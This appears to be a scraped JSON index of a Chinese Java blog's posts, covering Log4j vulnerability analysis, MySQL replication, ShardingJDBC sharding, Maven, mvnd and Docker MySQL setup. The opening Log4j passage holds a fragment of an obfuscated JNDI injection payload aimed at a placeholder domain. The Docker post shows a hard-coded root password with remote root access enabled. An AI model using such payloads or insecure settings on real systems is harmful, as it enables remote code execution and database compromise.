variable&quot;&gt;::−m&lt;/span&gt;&lt;spanclass=&quot;tokenvariable&quot;&gt;{::-i}😕/domain.com/j} 然后在匹配完后调用resolveVariable解析满足 Lookup 功能的语法 也就是这里调用的lookup去产生漏洞的 如支持的协议 即按照协议的语法去进行解析 date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j 这里的作用是 进行执行完lookup,然后将结果替换回原字符串后，再次调用 substitute 方法进行递归解析 ⑥跟lookup方法：产生漏洞的核心原因 然后接着跟 发觉核心就两部分 ①判断前缀部分 ②调用执行部分即调用jndiManager.lookup解析请求,最终形成注入漏洞. # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"},{"title":"主从同步遇到 Got fatal error 1236 from master when reading data from binary log","text":"# 首先遇到这个是因为 binlog 位置索引处的问题，不要 reset slave； reset slave 会将主从同步的文件以及位置恢复到初始状态，一开始没有数据还好，有数据的话，相当于重新开始同步，可能会出现一些问题； 一般做主从同步，都是要求以后的数据实现主从同步，而对于旧的数据完全可以使用数据库同步工具先将数据库同步，完了再进行主从同步； 好了遇到上面的问题，正确做法是： 1. 打开主服务器，进入 mysql 2. 执行 flush logs；// 这时主服务器会重新创建一个 binlog 文件； 3. 在主服务上执行 show master status; 显示如下： 4. 来到从服务器的 mysql； 5.stop slave; 6.change master to master_log_file=‘mysql-bin.000012’,master_log_pos=154;// 这里的 file 和 pos 都是上面主服务器 master 显示的。 7.start slave;// 这时候就应可以了 8.show slave status \\G; # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/07/17/%E3%80%90MYSQL%E3%80%91%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%BC%82%E5%B8%B8%E8%AE%B0%E5%BD%95/"},{"title":"Maven通过命令提示符引入jar包的流程","text":"安装好 Maven 之后配置环境变量： ​ 在系统变量新建 “MAVEN_HOME” 值为：Maven 的安装路径：E:\\Maven\\apache-maven-3.5.3，接着在 Path 变量中，添加：% MAVEN_HOME%\\bin，指定 maven 的 bin 路径。 ​ 现在在 CMD 中就可以用 mvn -v 的命令查看是否安装成功： # 引入流程： ​ 接下来找到你要引入的 jar 包的根路径，指定路径 + jar 包名，指定 groupId、artifactId、version 名，就可以引入了。 # 举例: ​ mvn install:install-file -Dfile=D:\\jar\\WxQyhPrj\\0.0.1-SNAPSHOT\\WxQyhPrj-0.0.1-SNAPSHOT.jar -DgroupId=com.chis.wx -DartifactId=WxQyhPrj -Dversion=0.0.1-SNAPSHOT -Dpackaging=jar ​ mvn install:install-file -Dfile：Jar 包的绝对路径 ​ -DgroupId：Jar 包的 groupId 分组 id ​ -DartiactId：Jar 包的 artifactId 版本 id ​ -Dversion：Jar 包的 version 版本 其中 – DgroupId 和 DartifactId 构成了该 jar 包在 pom.xml 的坐标， 对应依赖的 DgroupId 和 DartifactId – Dfile 表示需要上传的 jar 包的绝对路径 – Dpackaging 为安装文件的种类 – DgroupId 和 DartifactId 构成了该 jar 包在 pom.xml 的坐标， 对应依赖的 DgroupId 和 DartifactId – Dfile 表示需要上传的 jar 包的绝对路径 – Durl 私服上仓库的 url 精确地址 (打开 nexus 左侧 repositories 菜单，可以看到该路径) – DrepositoryId 服务器的表示 id，在 nexus 的 configuration 可以看到 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/17/%E3%80%90Maven%E3%80%91MVN%E5%BC%95%E5%85%A5Jar%E5%8C%85%E6%B5%81%E7%A8%8B/"},{"title":"【MYSQL】水平分表、分库和垂直分表、分库和公共表的代码实现和讲解","text":"# 文章目录 一、教学讲解视频 二、环境准备 三、水平分表 1. 概念 2. 代码 四、水平分库 1. 概念 2. 代码 五、垂直分表 1. 概念 2. 代码 六、垂直分库 1. 概念 2. 代码 七、公共表 1. 概念 2. 代码 # 一、教学讲解视频 教学讲解视频地址：视频地址 # 二、环境准备 操作系统：Win10 数据库：MySQL5.7 JDK：64 位 jdk1.8.0_202 应用框架：spring-boot-2.1.3.RELEASE Sharding-JDBC：sharding-jdbc-spring-boot-starter-4.0.0-RC1 对应的 pom.xml 依赖代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.yjq.programmer&lt;/groupId&gt; &lt;artifactId&gt;ShardingJDBC&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;name&gt;ShardingJDBC&lt;/name&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- 引入mysql连接依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.6&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 引入sharding-jdbc连接依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shardingsphere&lt;/groupId&gt; &lt;artifactId&gt;sharding-jdbc-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;4.0.0-RC1&lt;/version&gt; &lt;/dependency&gt; &lt;!--引入阿里巴巴druid连接池--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.19&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 引入测试依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- 集成mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 集成junit测试 --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;/build&gt;&lt;/project&gt; # 三、水平分表 # 1. 概念 水平分表是在 同一个 数据库内，把同一个表的数据 按一定规则 拆分到多个 表 中。 因此，目前我在一个数据库中准备了两个表， t_user_1 和 t_user_2 ，如下图。 表结构： 123456CREATE TABLE `t_user_1` ( `id` bigint(20) NOT NULL, `name` varchar(100) DEFAULT NULL, `sex` int(2) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; # 2. 代码 ①我们先来看下我们的 SpringBoot 的 配置文件 代码。 123456789101112131415161718192021222324252627282930313233343536server.port=8081#1800sserver.servlet.session.timeout=1800spring.jackson.time-zone=GMT+8spring.jackson.date-format=yyyy-MM-dd HH:mm:ss#定义数据源spring.shardingsphere.datasource.names=m1spring.shardingsphere.datasource.m1.url=jdbc:mysql://127.0.0.1:3306/db_user1?serverTimezone=GMT%2b8&amp;useUnicode=true&amp;characterEncoding=utf8spring.shardingsphere.datasource.m1.username=rootspring.shardingsphere.datasource.m1.password=spring.shardingsphere.datasource.m1.driver‐class‐name=com.mysql.jdbc.Driverspring.shardingsphere.datasource.m1.type=com.alibaba.druid.pool.DruidDataSource# 指定t_user表的数据分布情况，配置数据节点spring.shardingsphere.sharding.tables.t_user.actual‐data‐nodes=m1.t_user_$-&gt;{1..2}# 指定t_user表的主键生成策略为SNOWFLAKEspring.shardingsphere.sharding.tables.t_user.key‐generator.column=idspring.shardingsphere.sharding.tables.t_user.key‐generator.type=SNOWFLAKE# 指定t_user表的分表策略，分表策略包括分片键和分片算法spring.shardingsphere.sharding.tables.t_user.table‐strategy.inline.sharding‐column=idspring.shardingsphere.sharding.tables.t_user.table‐strategy.inline.algorithm‐expression=t_user_$-&gt;{id % 2 + 1}# 控制台日志配置logging.level.root=infologging.level.com.yjq.programmer.dao=debug# 打开sql输出日志spring.shardingsphere.props.sql.show=true#mapper文件扫描路径mybatis.mapper-locations=classpath*:mappers/**/*.xml 首先定义数据源 m1，并对 m1 进行实际的参数配置。 指定 t_user 表的数据分布情况，他分布在 m1.t_user_1，m1.t_user_2。 指定 t_user 表的主键生成策略为 SNOWFLAKE，SNOWFLAKE 是一种分布式自增算法，保证 id 全局唯一。 定义 t_user 分表策略，id 为偶数的数据落在 t_user_1，为奇数的落在 t_user_2，所以分表策略的表达式为 t_user_$-&gt;{id% 2 + 1}。 踩坑注意！ 如果启动项目有如下报错，可能是配置文件中的 -&gt; 没有用英文类型的。 ②然后接下来就写我们的 dao 层、 mapper 层和 单元测试 的代码，去测试我们的水平分表情况下 插入 和 查询 的结果。 dao 层 123456public interface UserDao { int insertUser(User user); List&lt;User&gt; selectUser();} mapper 层 12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.yjq.programmer.dao.UserDao&quot;&gt; &lt;insert id=&quot;insertUser&quot; parameterType=&quot;com.yjq.programmer.entity.User&quot;&gt; insert into t_user(name) values (#{name}) &lt;/insert&gt; &lt;select id=&quot;selectUser&quot; resultType=&quot;com.yjq.programmer.entity.User&quot;&gt; select * from t_user &lt;/select&gt;&lt;/mapper&gt;12345678910111213单元测试@Testpublic void testShardingJDBCInsert() { User user = new User(); for(int i=0; i&lt;10; i++) { user.setName(&quot;小明&quot; + i); if(userDao.insertUser(user) == 1) { logger.info(&quot;插入成功！&quot;); } else { logger.info(&quot;插入失败！&quot;); } }}@Testpublic void testShardingJDBCSelect() { List&lt;User&gt; userList = userDao.selectUser(); logger.info(&quot;查询结果：{}&quot;, JSONObject.toJSONString(userList));} ③结果说明 插入 id 为奇数的被插入到 t_user_2 表，为偶数的被插入到 t_user_1 表，达到预期目标。 查询 sharding-jdbc 分别去不同的表检索数据，达到预期目标；如果有传入 id 进行查询，sharding-jdbc 也会根据 t_user 的分表策略去不同的表检索数据。 # 四、水平分库 # 1. 概念 水平分库是把同一个表的数据按 一定规则 拆分到不同的 数据库 中，每个库可以放在不同的服务器上。 现在，我在 水平分表 的基础上多加了一个 db_user2 的数据库。 然后两个数据库中的表结构是一致的，表结构和上面水平分表用的保持一样。 # 2. 代码 ①我们先来看下我们的 SpringBoot 的 配置文件 代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546server.port=8081#1800sserver.servlet.session.timeout=1800spring.jackson.time-zone=GMT+8spring.jackson.date-format=yyyy-MM-dd HH:mm:ss#定义数据源spring.shardingsphere.datasource.names=m1,m2spring.shardingsphere.datasource.m1.url=jdbc:mysql://127.0.0.1:3306/db_user1?serverTimezone=GMT%2b8&amp;useUnicode=true&amp;characterEncoding=utf8spring.shardingsphere.datasource.m1.username=rootspring.shardingsphere.datasource.m1.password=spring.shardingsphere.datasource.m1.driver‐class‐name=com.mysql.jdbc.Driverspring.shardingsphere.datasource.m1.type=com.alibaba.druid.pool.DruidDataSourcespring.shardingsphere.datasource.m2.url=jdbc:mysql://127.0.0.1:3306/db_user2?serverTimezone=GMT%2b8&amp;useUnicode=true&amp;characterEncoding=utf8spring.shardingsphere.datasource.m2.username=rootspring.shardingsphere.datasource.m2.password=spring.shardingsphere.datasource.m2.driver‐class‐name=com.mysql.jdbc.Driverspring.shardingsphere.datasource.m2.type=com.alibaba.druid.pool.DruidDataSource# 分库策略spring.shardingsphere.sharding.tables.t_user.database‐strategy.inline.sharding‐column=sexspring.shardingsphere.sharding.tables.t_user.database‐strategy.inline.algorithm‐expression=m$-&gt;{sex % 2 + 1}# 指定t_user表的数据分布情况，配置数据节点spring.shardingsphere.sharding.tables.t_user.actual‐data‐nodes=m$-&gt;{1..2}.t_user_$-&gt;{1..2}# 指定t_user表的主键生成策略为SNOWFLAKEspring.shardingsphere.sharding.tables.t_user.key‐generator.column=idspring.shardingsphere.sharding.tables.t_user.key‐generator.type=SNOWFLAKE# 指定t_user表的分表策略，分表策略包括分片键和分片算法spring.shardingsphere.sharding.tables.t_user.table‐strategy.inline.sharding‐column=idspring.shardingsphere.sharding.tables.t_user.table‐strategy.inline.algorithm‐expression=t_user_$-&gt;{id % 2 + 1}# 控制台日志配置logging.level.root=infologging.level.com.yjq.programmer.dao=debug# 打开sql输出日志spring.shardingsphere.props.sql.show=true#mapper文件扫描路径mybatis.mapper-locations=classpath*:mappers/**/*.xml 配置了两个数据源，分配指向两个不同的数据库 db_user1 和 db_user2。 配置分库策略，sex 字段为偶数的数据落在 m1 数据源，为奇数的落在 m2 数据源，所以分库策略的表达式为 m$-&gt;{sex % 2 + 1}。 配置分表策略，分表策略和上面水平分表保持一致。 也就是当有数据来时，先根据 sex 字段判断落入哪个数据源，然后再根据 id 字段来判断落入哪个表中。 ②然后接下来就写我们的 dao 层、 mapper 层和 单元测试 的代码，去测试我们的水平分表情况下 插入 和 查询 的结果。 dao 层 123456public interface UserDao { int insertUser(User user); List&lt;User&gt; selectUser(User user);} mapper 层 1234567891011121314151617181920212223242526272829303132333435363738&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.yjq.programmer.dao.UserDao&quot;&gt; &lt;insert id=&quot;insertUser&quot; parameterType=&quot;com.yjq.programmer.entity.User&quot;&gt; insert into t_user(name, sex) values (#{name}, #{sex}) &lt;/insert&gt; &lt;select id=&quot;selectUser&quot; parameterType=&quot;com.yjq.programmer.entity.User&quot; resultType=&quot;com.yjq.programmer.entity.User&quot;&gt; select * from t_user t where t.sex = #{sex} and t.id = #{id} &lt;/select&gt;&lt;/mapper&gt;12345678910111213单元测试@Testpublic void testShardingJDBCInsert() { User user = new User(); for(int i=0; i&lt;10; i++) { user.setName(&quot;小明&quot; + i); user.setSex(1); if(userDao.insertUser(user) == 1) { logger.info(&quot;插入成功！&quot;); } else { logger.info(&quot;插入失败！&quot;); } }}@Testpublic void testShardingJDBCSelect() { User user = new User(); user.setSex(1); user.setId(821357967667363840L); List&lt;User&gt; userList = userDao.selectUser(user); logger.info(&quot;查询结果：{}&quot;, JSONObject.toJSONString(userList));} ③结果说明 插入 sex 字段为奇数的数据落入 m2 数据源，为偶数的落入 m1 数据源。同时 id 字段值为奇数的，插入 t_user_2 表中，为偶数的插入 t_user_1 表中，达到预期目标。 查询 sharding-jdbc 分别去不同的表检索数据，达到预期目标；如果有传入 sex 进行查询，sharding-jdbc 会根据 t_user 的分库策略去锁定查哪个库，如果有传入 id 进行查询，sharding-jdbc 会根据 t_user 的分表策略去锁定查哪个表。 # 五、垂直分表 # 1. 概念 垂直分表一般就是把表的结构进行改造，关于如何改造，可以浏览我的另一篇博客： 分库分表：垂直分库、垂直分表、水平分库、水平分表四个概念 大致的思路就是：将一个表按照字段分成多表，每个表存储其中一部分字段。 # 2. 代码 无代码，垂直分表属于表结构设计层面。 # 六、垂直分库 # 1. 概念 垂直分库就是在 垂直分表 把表进行分类后，放到 不同的数据库 中。每个库可以放在不同的服务器上，它的核心理念是 专库专用 。关于如何改造，同样可以浏览我的另一篇博客： 分库分表：垂直分库、垂直分表、水平分库、水平分表四个概念 # 2. 代码 无代码，垂直分库属于数据库设计层面。 # 七、公共表 # 1. 概念 公共表属于系统中数据量较小，变动少，而且属于高频联合查询的依赖表。参数表、数据字典表等属于此类型。 可以将这类表在每个数据库都保存一份 ，所有更新操作都同时发送到所有分库执行。 # 2. 代码 ①只需要在 SpringBoot 的 配置文件 中加入下面这行来指明公共表就行。 如果有多个公共表，用逗号拼接就行 123#公共表设置spring.shardingsphere.sharding.broadcast‐tables=t_dict12 ②然后接下来就写我们的 dao 层、 mapper 层和 单元测试 的代码，去测试我们的公共表的 插入 的结果。 dao 层 1234public interface DictDao { int insertDict(Dict dict);} mapper 层 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.yjq.programmer.dao.DictDao&quot;&gt; &lt;insert id=&quot;insertDict&quot; parameterType=&quot;com.yjq.programmer.entity.Dict&quot;&gt; insert into t_dict(id, name) values (#{id}, #{name}) &lt;/insert&gt;&lt;/mapper&gt;12345678910单元测试@Testpublic void testShardingJDBCInsertDict() { Dict dict = new Dict(); dict.setId(1); dict.setName(&quot;字典名称&quot;); if(dictDao.insertDict(dict) == 1) { logger.info(&quot;插入成功！&quot;); } else { logger.info(&quot;插入失败！&quot;); }} ③结果说明 插入 插入的数据在 每个库中的对应的公共表 中都能看到，达到预期目标。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/06/%E3%80%90MYSQL%E3%80%91%E6%B0%B4%E5%B9%B3%E5%88%86%E8%A1%A8%E3%80%81%E5%88%86%E5%BA%93%E5%92%8C%E5%9E%82%E7%9B%B4%E5%88%86%E8%A1%A8%E3%80%81%E5%88%86%E5%BA%93%E5%92%8C%E5%85%AC%E5%85%B1%E8%A1%A8%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%92%8C%E8%AE%B2%E8%A7%A3/"},{"title":"Linux下docer部署mysql","text":"# Linux 下 docer 部署 mysql 部署方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263641.首先在Linux系统中启动已经安装好的dockerservice docker start2.查看docker进程，确认docker启动成功ps -ef|grep docker3.在docker容器中查询MySQLdocker search mysql4.在docker中安装MySQLdocker pull mysql5.查看MySQL镜像docker images6.创建MySQL用户并且将root账户密码设置为你需要的密码docker run --name mysqlserver -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=『你的账户密码』 -d -i -p 外网端口:3306 mysql:latestdocker run -p 33001:3306 --name mysqlSlave2 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -e MYSQL_ROOT_PASSWORD=Lgq081538 -d mysql:5.7#指定配置文件容器docker run -p 33001:3306 --name mysqlSlave2 \\-v /usr/local/docker/mysql/logs:/var/log/mysql \\-v /usr/local/docker/mysql/data:/var/lib/mysql \\-v /usr/local/docker/mysql/conf/my.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf \\-e MYSQL_ROOT_PASSWORD=Lgq081538 \\-d mysql:5.77.在docker中启动MySQLdocker exec -it mysqlSlave2 bash8.输入用户名和密码mysql -uroot -p9.开启MySQL远程访问权限use mysql;select host,user from user;ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY 'Lgq081538';flush privileges;一些在docker的常用命令：1、列出正在运行的容器docker ps -a2、列出包括未运行的所有的容器docker ps3、查看某进程最近10条运行日志docker logs -f --tail 10 &quot;所查询的进程ID&quot;4、关闭docker中运行的进程，以MySQL为例docker stop mysql或者docker stop &quot;要停止的进程ID&quot;5、重启docker中运行的进程docker restart &quot;要重启的进程ID&quot;6、重启dockersystemctl restart docker7、停止dockersystemctl stop docker # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/06/24/%E3%80%90MySQL%E3%80%91Linux%E4%B8%8Bdocer%E9%83%A8%E7%BD%B2mysql/"},{"title":"Maven加强版 — mvnd的使用测试","text":"# Maven 加强版 — mvnd 的使用测试 Maven、gradle 作为主流的构建工具，几乎所有的 Java 项目都使用，但是 Maven 相对 gradle 来说，构建还是太慢了。特别是构建十几个子项目的程序。 如果要把项目从 Maven 转换成 gradle，成本也是巨大的。 但是现在有了 maven-mvnd ，可以使构建变得更快。 # 1、maven-mvnd 介绍 maven-mvnd 是 Apache Maven团队 借鉴了 Gradle 和 Takari 的优点，衍生出来的更快的构建工具，是 maven 的 强化版 。 github 地址：https://github.com/apache/maven-mvnd maven-mvnd 特性： 嵌入 Maven (所以不需要单独安装 Maven)； maven 过渡到 maven-mvnd 的过程中实现 无缝切换 ！所以不需要再安装 maven 或进行复杂的配置更改。 实际的构建发生在一个长期存在的后台进程中，也就是守护进程。如果没有为构建请求服务的空闲守护进程，则可以并行产生多个守护进程。 一个守护进程实例可以处理来自 mvnd 客户机的多个连续请求。 使用 GraalVM 构建的本地可执行文件。与传统的 JVM 相比，它启动更快，使用的内存更少。 这种架构带来的优势有： 运行实际构建的 JVM 不需要为每个构建重新启动，节省时间。 JVM 中的实时 (JIT) 编译器生成的本机代码也保留了下来。与 Maven 相比，JIT 编译花费的时间更少。在重复构建过程中，JIT 优化的代码可以立即使用。这不仅适用于来自 Maven 插件和 Maven Core 的代码，也适用于来自 JDK 本身的所有代码。 # 2、使用步骤 # 2.1、下载 下载：https://github.com/mvndaemon/mvnd/releases 我这里是 windows，下载 mvnd-0.7.1-windows-amd64.zip 版本即可。 # 2.2、安装 直接解压。 然后配置环境变量：将 bin 目录添加到 PATH # 2.3、测试 打开 CMD 终端，输入 mvnd -v 可以看到如下信息表示安装成功： 12345678C:\\Users\\HaC&gt; mvnd -vmvnd native client 0.7.1-windows-amd64 (97c587c11383a67b5bd0ff8388bd94c694b91c1e)Terminal: org.jline.terminal.impl.jansi.win.JansiWinSysTerminalApache Maven 3.8.3 (ff8e977a158738155dc465c6a97ffaf31982d739)Maven home: E:\\apache-mvnd-0.7.1-windows-amd64\\mvnJava version: 1.8.0_131, vendor: Oracle Corporation, runtime: E:\\JDK1.8\\jreDefault locale: zh_CN, platform encoding: GBKOS name: &quot;windows 10&quot;, version: &quot;10.0&quot;, arch: &quot;amd64&quot;, family: &quot;windows&quot; 可以看到 mvnd 集成了 Maven 3.8.3 版本。 # 2.4、使用 在使用上和 Maven 一样，参数也一致。 Maven 使用 mvn clean package ；使用 Maven-mvnd 只需要变成 mvnd clean package 即可，其他同理。 # 2.5、配置修改 为了最小程度的兼容原来的 Maven，可以使用原来的 setting.xml 打开 Maven-mvnd 安装目录下 的 /conf/mvnd.properties 文件，修改： 1maven.settings=E://apache-maven-3.5.4-bin//apache-maven-3.5.4//conf//settings.xml （注意是 // ） # 3、打包对比 由于 mvnd-0.7.1 版本使用了 Maven 3.8.3 版本，我这里同样使用 Maven 3.8.3 进行对比。 命令： 1234# maven 打包命令mvn clean package -Dmaven.test.skip=true# mvnd 打包命令mvnd clean package -Dmaven.test.skip=true 电脑配置： CPU：Intel® Core™ i7-4790 CPU @ 3.60GHz 3.60 GHz 内存：16GB 结果如下： 13 个子项目 41 秒 vs 21 秒 可以看到 mvnd 打包的总时间比 mvn 快了不少，因为 mvnd 使用了 CPU 的多核心，可以看到每个子模块打包的时间都差不多，所以在单核的机器，就不要尝试使用 mvnd 了。 19 个子项目 32 秒 vs 10 秒 呈现子项目越多，相对速度更快的趋势。 总的来说： 如果项目模块很多，可以尝试使用 mvnd 进行辅助打包，比如 测试、生产，可以节省很多时间； 开发则可以继续使用 mvn ，毕竟 IDEA 无法集成 mvnd，可以在 terminal 通过命令打包。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/08/%E3%80%90Maven%E3%80%91Maven%E5%8A%A0%E5%BC%BA%E7%89%88%20%E2%80%94%20mvnd%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/"},{"title":"【MySQL】MySQL主从开关机顺序","text":"MySQL 主从开关机顺序 停应用 -&gt; 停数据库（先备后主） -&gt; 改配置 -&gt; 启数据库（先主后备）-&gt; 启应用 关闭 MySQL 从库 a. 先查看当前的主从同步状态 show slave statusG; 看是否双 yes b. 执行 stop slave c. 停止从库服务 mysqladmin shutdown -u 用户名 -p 密码 d. 查看是否还有 mysql 的进程 ps -ef | grep mysql d. 如果部署了多个实例，那每个实例都要按照以上步骤来操作 关闭 MySQL 主库 a. 停止主库服务 mysqladmin shutdown -u 用户名 -p 密码 b. 查看是否还有 mysql 的进程 ps -ef | grep mysql 启动 MySQL 主库 a. 启动主库服务 mysqladmin start -u 用户名 -p 密码 b. 查看 mysql 的进程 ps -ef | grep mysql 启动 MySQL 从库 a. 启动从库服务 mysqladmin start -u 用户名 -p 密码 b. 启动复制 start slave; c. 检查同步状态 show slave statusG; 是否双 yes d. 查看 mysql 的进程 ps -ef | grep mysql # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/04/27/%E3%80%90MySQL%E3%80%91MySQL%E4%B8%BB%E4%BB%8E%E5%BC%80%E5%85%B3%E6%9C%BA%E9%A1%BA%E5%BA%8F/"},{"title":"【MySQL】MySql相关优化分享","text":"# 【MySQL】MySql 相关优化分享 # 文章目录 前言 一、数据库优化 1. 选择合适存储引擎 2. 选择合适的连接池 3. 分库分表 4. 主从同步 二、表优化 1. 表中的字段选择合适的数据类型 2. 适当添加索引 3. 表中适当保留冗余数据 4. 增加中间表 5. 字段很多的表分解成多个表 6. 添加适当存储过程 三、SQL 语句优化 1. 尽量使用表的别名，减少解析 2.select 子句中避免使用 * 号 3. 将 where 中用的比较频繁的字段建立索引，避免全表扫描 4. 避免索引失效情况 5. 当只需要一条数据的时候可以使用 limit 1 6. 调整 Where 字句中的连接顺序 7. 小表驱动大表 8. 善用 EXPLAIN 查看 SQL 执行计划 # 前言 现在在网上搜索，有很多类似文章，mysql 优化大全，mysql 最强总结等等，部分文章存在一些错误。在这里个人总结整理的一些点，希望对大家有所帮助。 本篇从数据库、表、sql 语句几个维度来说优化，如果文章有误之处欢迎指正～ # 一、数据库优化 # 1. 选择合适存储引擎 MySQL5.5 版本开始，InnoDB 已经成为 Mysql 的默认引擎 (之前是 MyISAM)，说明其优势是有目共睹的。如果你不知道用什么存储引擎，那就用 InnoDB，至少不会差。 如何选择呢： 是否要支持事务，如果要请选择 InnoDB，如果不需要可以考虑 MyISAM； 如果表中绝大多数都只是读查询，可以考虑 MyISAM，如果既有读，写也挺频繁，请使用 InnoDB。 系统奔溃后，MyISAM 恢复起来更困难，能否接受，不能接受就选 InnoDB； # 2. 选择合适的连接池 1：性能方面 hikariCP&gt;druid&gt;tomcat-jdbc&gt;dbcp&gt;c3p0 。hikariCP 的高性能得益于最大限度的避免锁竞争。 2：druid 功能最为全面，sql 拦截等功能，统计数据较为全面，具有良好的扩展性。 3：HikariCP 因为细节方面优化力度较大，性能方面强于 Druid 4：综合性能，扩展性等方面，可考虑使用 druid 或者 hikariCP 